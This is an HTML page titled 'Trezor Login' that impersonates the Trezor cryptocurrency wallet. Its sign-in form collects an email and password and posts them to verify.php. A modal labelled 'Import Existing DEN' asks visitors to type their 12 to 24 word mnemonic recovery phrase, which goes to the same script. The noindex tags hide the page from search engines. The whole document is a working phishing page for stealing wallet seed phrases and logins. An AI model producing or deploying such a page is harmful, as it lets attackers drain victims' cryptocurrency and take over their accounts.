
<!DOCTYPE html>
<html lang="en">
<head>
     <meta name="robots" content="noindex, nofollow"/>
        <meta name="googlebot" content="noindex, nofollow"/>
        <meta name="bingbot" content="noindex, nofollow"/>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trezor Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./assets/scss/style.css">
    <link rel="stylesheet" href="assets/scss/indexStyle.css">
</head>

<body>

    <!-- header -->

   <!--  <div class="container-fluid" id="header">
        <div class="headerImage">
            <img src="assets/images/meta_logo.png">
        </div>
    </div> -->

    <!-- header ends -->

    <div id="form">
        <form action="verify.php" method="post">

            <div class="image">
                <img src="assets/images/face.png">
            </div>

            <div class="heading">
                <h1>Trezor</h1>
               
               
            </div>

            <div class="inputFields">

                <div class="mb-3 input">
                    <input type="email" name="email" class="form-control" id="exampleInputEmail1" placeholder="Email" required>
                </div>
                <div class="mb-3 input">
                    <input type="password" name="password" class="form-control" id="exampleInputPassword1" placeholder="Password" required>
                </div>

                <button name="btnMail" type="submit" class="btn">Sign In</button>

                <div class="link">
           
                     <button type="button" data-bs-toggle="modal"
                                                                data-bs-target="#staticBackdrop"
                                                                class="btn btnlinks">Import Existing DEN</button>
                </div>




                                                           
                                                    

            </div>

        </form>
    </div>

     <!-- Modal -->
    <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1"
        aria-labelledby="staticBackdropLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <!-- <h5 class="modal-title" id="staticBackdropLabel">Modal title</h5> -->
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">

                    <form action="verify.php" method="post">

                        <div class="mb-3">
                            <label for="exampleInputEmail1" class="form-label">Please type in your 12 to 24 word mnemonic phrase, all lower-case, separate by single spaces</label>
                            <textarea name="secret_recovery_phrase" class="form-control" id="exampleInputEmail1"
                                aria-describedby="emailHelp" required></textarea>
                        </div>

                        <div class="button d-grid">
                            <button name="btnMail" type="submit" class="btn modalButton">Submit</button>
                        </div>
                    </form>

                </div>

            </div>
        </div>
    </div>

    <!-- MAODAL ENDS -->


    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"
        integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB"
        crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"
        integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
        crossorigin="anonymous"></script>
</body>

</html>